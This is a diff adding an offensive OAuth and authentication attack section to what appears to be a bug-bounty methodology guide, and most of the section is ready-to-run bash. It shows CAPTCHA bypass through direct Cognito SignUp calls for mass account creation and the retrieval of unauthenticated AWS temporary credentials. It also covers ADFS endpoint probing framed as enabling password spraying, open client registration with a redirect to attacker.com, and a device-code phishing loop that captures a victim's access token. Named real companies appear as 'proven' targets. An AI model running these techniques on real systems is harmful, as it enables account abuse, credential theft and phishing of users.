@@ -463,6 +463,193 @@ Fix: enforce strict equality on redirect_uri
 [2026-04-10 14:10] IDP=... BUG=code-reuse RESULT=invalid_grant (fixed)
 ```
 
+---
+
+## Battle-Tested OAuth/Auth Techniques (2026)
+
+**Proven on: Bumba Exchange (captcha bypass, SSO settings leak), REI (ADFS full exposure)**
+
+These techniques were discovered and validated during real bug bounty hunts in April 2026. They target real-world auth implementations — AWS Cognito, ADFS, and OpenID Connect.
+
+### 1. AWS Cognito Direct SignUp API (Captcha Bypass)
+
+Many apps use AWS Cognito for auth and add CAPTCHA on their frontend registration form. But the Cognito User Pool API is directly accessible — you can call `SignUp` without going through the frontend, bypassing CAPTCHA entirely.
+
+```bash
+# Step 1: Extract Cognito pool details from JS bundles
+# Look for: aws_user_pools_id, aws_user_pools_web_client_id, region
+# JS Extractor will find these in webpack bundles, env.js, or config files
+
+REGION="us-east-1"
+CLIENT_ID="abc123def456"  # aws_user_pools_web_client_id from JS
+POOL_ID="us-east-1_AbCdEfG"  # aws_user_pools_id from JS
+
+# Step 2: Call Cognito SignUp API directly (no CAPTCHA)
+aws cognito-idp sign-up \
+  --region "$REGION" \
+  --client-id "$CLIENT_ID" \
+  --username "attacker@test.com" \
+  --password "TestPassword123!" \
+  --user-attributes Name=email,Value=attacker@test.com
+
+# If this works without CAPTCHA → mass account creation is possible
+# On Bumba: frontend had hCaptcha, but direct Cognito API had no CAPTCHA enforcement
+```
+
+### 2. Cognito Pool Credential & Config Leak
+
+Once you have the Cognito pool ID and client ID (from JS extraction), query the pool for configuration leaks.
+
+```bash
+# Describe the user pool client (sometimes works unauthenticated)
+aws cognito-idp describe-user-pool-client \
+  --region "$REGION" \
+  --user-pool-id "$POOL_ID" \
+  --client-id "$CLIENT_ID" 2>/dev/null
+
+# List identity pools (if identity pool ID found in JS)
+IDENTITY_POOL_ID="us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+aws cognito-identity get-id \
+  --region "$REGION" \
+  --identity-pool-id "$IDENTITY_POOL_ID"
+
+# Get temporary AWS credentials from identity pool (often works unauthenticated)
+aws cognito-identity get-credentials-for-identity \
+  --region "$REGION" \
+  --identity-id "us-east-1:yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"
+
+# Check what the unauthenticated role can access
+# These temp creds sometimes have S3, DynamoDB, or Lambda access
+```
+
+### 3. ADFS Password Portal Exposure Testing
+
+Active Directory Federation Services (ADFS) often exposes password-related endpoints that should be internal-only.
+
+```bash
+# Test for exposed ADFS endpoints
+ADFS="https://adfs.target.com"
+
+# Password change portal (should be internal only)
+curl -sk "$ADFS/adfs/portal/updatepassword/" -o /dev/null -w "%{http_code}"
+
+# Forms-based auth (allows password spraying)
+curl -sk "$ADFS/adfs/ls/?client-request-id=test&wa=wsignin1.0&wtrealm=test" \
+  -o /dev/null -w "%{http_code}"
+
+# Extranet lockout test endpoint
+curl -sk "$ADFS/adfs/services/trust/2005/windowstransport" \
+  -o /dev/null -w "%{http_code}"
+
+# If updatepassword returns 200 → external users can change AD passwords
+# On REI: ADFS password portal was fully exposed to the internet
+```
+
+### 4. ADFS WS-Trust UsernameMixed Endpoint Testing
+
+The `UsernameMixed` endpoint in ADFS accepts username/password over HTTPS and returns security tokens. If exposed externally, it enables password spraying without lockout protections.
+
+```bash
+# Test WS-Trust UsernameMixed endpoint
+curl -sk -X POST "$ADFS/adfs/services/trust/2005/usernamemixed" \
+  -H "Content-Type: application/soap+xml" \
+  -d '<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:a="http://www.w3.org/2005/08/addressing"
+            xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
+  <s:Header>
+    <a:Action s:mustUnderstand="1">http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue</a:Action>
+    <a:To s:mustUnderstand="1">'"$ADFS"'/adfs/services/trust/2005/usernamemixed</a:To>
+  </s:Header>
+  <s:Body>
+    <trust:RequestSecurityToken xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">
+      <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
+        <a:EndpointReference>
+          <a:Address>urn:federation:MicrosoftOnline</a:Address>
+        </a:EndpointReference>
+      </wsp:AppliesTo>
+      <trust:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</trust:RequestType>
+    </trust:RequestSecurityToken>
+  </s:Body>
+</s:Envelope>'
+
+# Also test the 2005/windowstransport and 13/windowstransport endpoints
+for EP in \
+  "/adfs/services/trust/2005/usernamemixed" \
+  "/adfs/services/trust/13/usernamemixed" \
+  "/adfs/services/trust/2005/windowstransport" \
+  "/adfs/services/trust/13/windowstransport" \
+  "/adfs/services/trust/2005/certificatemixed" \
+; do
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$ADFS$EP" \
+    -H "Content-Type: application/soap+xml" -d '<test/>')
+  echo "$CODE $EP"
+done
+```
+
+### 5. OpenID Configuration Deep Analysis
+
+Go beyond just reading the OIDC discovery doc — analyze every field for attack surface.
+
+```bash
+OIDC=$(curl -sS "https://target.com/.well-known/openid-configuration")
+
+# Check for dangerous grant types
+echo "$OIDC" | jq '.grant_types_supported'
+# LOOK FOR:
+# - "password" → Resource Owner Password Credentials (direct password auth, no MFA)
+# - "urn:ietf:params:oauth:grant-type:device_code" → Device code flow (phishable)
+# - "client_credentials" → If client_id/secret are leaked, direct token access
+# - "implicit" → Tokens in URL fragments (deprecated for good reason)
+
+# Check for dangerous scopes
+echo "$OIDC" | jq '.scopes_supported'
+# LOOK FOR:
+# - "user_impersonation" → Can impersonate other users
+# - "vpn_cert" → Can request VPN certificates (network access!)
+# - "offline_access" → Refresh tokens (persistent access)
+# - "admin" or "write:all" → Elevated privileges
+
+# Check for exposed endpoints
+echo "$OIDC" | jq -r '.device_authorization_endpoint, .registration_endpoint, .revocation_endpoint, .introspection_endpoint' | grep -v null
+
+# If registration_endpoint exists → dynamic client registration may be open
+curl -sk -X POST "$(echo $OIDC | jq -r '.registration_endpoint')" \
+  -H "Content-Type: application/json" \
+  -d '{"redirect_uris":["https://attacker.com/cb"],"client_name":"test"}'
+```
+
+### 6. Device Code Flow Exploitation
+
+If `device_authorization_endpoint` is available, the device code flow can be used for phishing — the victim enters a short code on a legitimate-looking page, granting the attacker a token.
+
+```bash
+DEVICE_EP=$(echo "$OIDC" | jq -r '.device_authorization_endpoint')
+TOKEN_EP=$(echo "$OIDC" | jq -r '.token_endpoint')
+
+# Step 1: Request a device code
+curl -sk -X POST "$DEVICE_EP" \
+  -d "client_id=$CLIENT_ID" \
+  -d "scope=openid profile" | jq .
+# Returns: device_code, user_code, verification_uri
+
+# Step 2: Phish the victim — send them the verification_uri + user_code
+# "Please go to https://login.target.com/device and enter code: ABCD-1234"
+
+# Step 3: Poll for token (attacker does this while victim enters the code)
+DEVICE_CODE="xxx"
+while true; do
+  RESULT=$(curl -sk -X POST "$TOKEN_EP" \
+    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
+    -d "client_id=$CLIENT_ID" \
+    -d "device_code=$DEVICE_CODE")
+  echo "$RESULT" | jq -r '.error // .access_token'
+  echo "$RESULT" | jq -e '.access_token' >/dev/null 2>&1 && break
+  sleep 5
+done
+# When victim authorizes → attacker gets their access_token
+```
+
 ## References
 - https://datatracker.ietf.org/doc/html/rfc6749
 - https://datatracker.ietf.org/doc/html/rfc7636
